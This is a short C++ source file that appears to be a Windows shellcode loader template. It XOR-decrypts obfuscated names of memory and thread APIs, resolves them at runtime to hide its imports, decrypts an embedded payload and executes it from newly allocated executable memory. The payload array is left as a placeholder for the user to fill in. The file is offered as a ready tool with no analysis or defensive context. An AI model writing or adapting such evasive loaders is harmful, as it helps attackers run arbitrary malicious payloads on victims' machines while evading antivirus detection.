#include<Windows.h>
#include<iostream>

// XOR encrypt/decrypt function
void xor_encrypt_decrypt(unsigned char* data, size_t data_len, const char* key) {

	size_t key_len = strlen(key); //getting the size of key
	//start encrypting/decrypting the shellcode bytes 
	for (size_t i = 0; i < data_len; i++) {
		data[i] ^= key[i % key_len]; // XOR with repeating key
	}
}

//encrypted shellcode
unsigned char shellcode[] =
//Put your encrypted shellcode here 
;

//create typedefs for the functions VirtualAlloc,VirtualProtect,CreateThread
typedef LPVOID(WINAPI* myVirAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL(WINAPI* myVirProt)(LPVOID,SIZE_T,DWORD,PDWORD);
typedef HANDLE(WINAPI* myCreateThr)(LPSECURITY_ATTRIBUTES,SIZE_T,LPTHREAD_START_ROUTINE,LPVOID,DWORD,LPDWORD);


int main()
{

	const char* key = "secret";  //key

	//encrypted strings
	unsigned char v_alloc[] = "\x25\x0C\x11\x06\x10\x15\x1F\x24\x0F\x1E\x0A\x17\x73";
	unsigned char v_prot[] = "\x25\x0C\x11\x06\x10\x15\x1F\x35\x11\x1D\x11\x11\x10\x11\x63";
	unsigned char c_thread[] = "\x30\x17\x06\x13\x11\x11\x27\x0D\x11\x17\x04\x10\x73";

	//decrypt all the strings
	xor_encrypt_decrypt(v_alloc, sizeof(v_alloc), key);
	xor_encrypt_decrypt(v_prot, sizeof(v_prot), key);
	xor_encrypt_decrypt(c_thread, sizeof(c_thread), key);

	//load the dll
	HMODULE kernel32dll = LoadLibraryA("kernel32.dll");

	//load the functions from the dll
	myVirAlloc new_VAlloc = (myVirAlloc)GetProcAddress(kernel32dll, (LPCSTR)v_alloc);
	myVirProt new_VProtect = (myVirProt)GetProcAddress(kernel32dll, (LPCSTR)v_prot);
	myCreateThr new_create_thr = (myCreateThr)GetProcAddress(kernel32dll, (LPCSTR)c_thread);

	//allocate the memory
	LPVOID allocateMem = new_VAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	
	xor_encrypt_decrypt(shellcode, sizeof(shellcode), key);

	//copy the shellcode to allocate memory
	RtlMoveMemory(allocateMem, shellcode, sizeof(shellcode));

	//make it executable
	DWORD oldprotect = 0;
	new_VProtect(allocateMem, sizeof(shellcode), PAGE_EXECUTE_READ, &oldprotect);

	//execute it
	HANDLE hThread = new_create_thr(NULL, 0, (LPTHREAD_START_ROUTINE)allocateMem, NULL, NULL, NULL);
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	return 0;
}
